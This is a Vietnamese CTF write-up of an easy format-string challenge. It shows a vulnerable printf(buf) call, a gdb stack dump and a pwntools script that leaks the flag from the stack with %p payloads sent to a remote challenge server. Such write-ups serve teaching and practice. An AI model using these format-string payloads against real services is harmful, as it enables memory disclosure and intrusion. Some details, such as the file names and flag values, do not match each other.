# [CTF] - [format-string-3]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `academy{4n1m41_57y13_4x4_f14g_f7ab2890}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `format-string-1`, `format-string-1.c`
- **Kết quả checksec:**
  ```bash
  [*] '/home/nguyenngochoan/picoctf/valley'
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    No Canary found
      NX:       NX enabled
      PIE:      N0 PIE

### 2. Phân tích tĩnh : 
- Chương trình cần đọc 3 file lần lượt là `flag.txt` , `secret-menu-item-2.txt` , `secret-menu-item-1.txt` 
```printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf); <-- lỗi fmtstr
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  ```
- Có lỗi fmtstr khi in `buf` ra ngoài màn hình , chương trình cho nhập `1024 byte` 
- Chạy thử `gdb` xem `flag` vứt ở đâu trên `stack` : 
```
00:0000│ rsp 0x7fffffffd890 ◂— '123123123123123'
01:0008│-4c8 0x7fffffffd898 ◂— 0x33323133323133 /* '3123123' */
02:0010│-4c0 0x7fffffffd8a0 ◂— 0
03:0018│-4b8 0x7fffffffd8a8 —▸ 0x7ffff7ffdab0 (_rtld_global+2736) —▸ 0x7ffff7fc5000 ◂— 0x3010102464c457f
04:0020│-4b0 0x7fffffffd8b0 ◂— 0x7fff3de00ec7
05:0028│-4a8 0x7fffffffd8b8 —▸ 0x7ffff7ff39d7 ◂— 0x636f6c6c616572 /* 'realloc' */
06:0030│-4a0 0x7fffffffd8c0 ◂— 4
07:0038│-498 0x7fffffffd8c8 ◂— 0
08:0040│-490 0x7fffffffd8d0 ◂— 'academy{G07_G07?_76eae555}'
09:0048│-488 0x7fffffffd8d8 ◂— 'G07_G07?_76eae555}'
0a:0050│-480 0x7fffffffd8e0 ◂— '_76eae555}'
0b:0058│-478 0x7fffffffd8e8 ◂— 0x7fff00007d35 /* '5}' */
0c:0060│-470 0x7fffffffd8f0 —▸ 0x7ffff7ffdab0 (_rtld_global+2736) —▸ 0x7ffff7fc5000 ◂— 0x3010102464c457f
0d:0068│-468 0x7fffffffd8f8 —▸ 0x7fffffffd908 ◂— 0xffffffff
0e:0070│-460 0x7fffffffd900 —▸ 0x7fffffffda00 —▸ 0x7ffff7ffe680 —▸ 0x7ffff7ffe5d8 —▸ 0x7ffff7fbd6c0 ◂— ...
0f:0078│-458 0x7fffffffd908 ◂— 0xffffffff
10:0080│-450 0x7fffffffd910 ◂— 'okokeokeokeoekeoekeoeoe'
11:0088│-448 0x7fffffffd918 ◂— 'okeoekeoekeoeoe'
12:0090│-440 0x7fffffffd920 ◂— 0x656f656f656b65 /* 'ekeoeoe' */
13:0098│-438 0x7fffffffd928 ◂— 0
```
- Ta có thể thấy rõ nó nằm ở vị trí thứ `9->11` từ `rsp` nếu nó đủ to có thể là thứ `12` hoặc dài hơn .

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng : 
- Vì `flag` được vứt trên stack nên ta có thể dùng `%p` để có thể in nó ra một chuỗi dài và từ đó có thể cắt nó ra biên dịch và ghép nó lại thành hoàn chỉnh để in ra màn hình 

### 2. Kịch bản tấn công :
```
#!/usr/bin/env python3
from pwn import *

exe = ELF("./format-string-1", checksec=False)
context.binary = exe

#p = process(exe.path)
p = remote('xebec.cylabacademy.net',29756)


payload = b'%14$p%15$p%16$p%17$p%18$p'
p.sendline(payload)
p.recvuntil(b'order: ')
data_line = p.recvline().strip()
log.info(f'raw : {data_line}')

parts = data_line.split(b'0x') 

flag_1 = int(b'0x' + parts[1], 16)
flag_2 = int(b'0x' + parts[2], 16)
flag_3 = int(b'0x' + parts[3], 16)
flag_4 = int(b'0x' + parts[4], 16)
flag_5 = int(b'0x' + parts[5], 16)


print(p64(flag_1) + p64(flag_2) + p64(flag_3) + p64(flag_4) + p64(flag_5))
p.interactive()
```
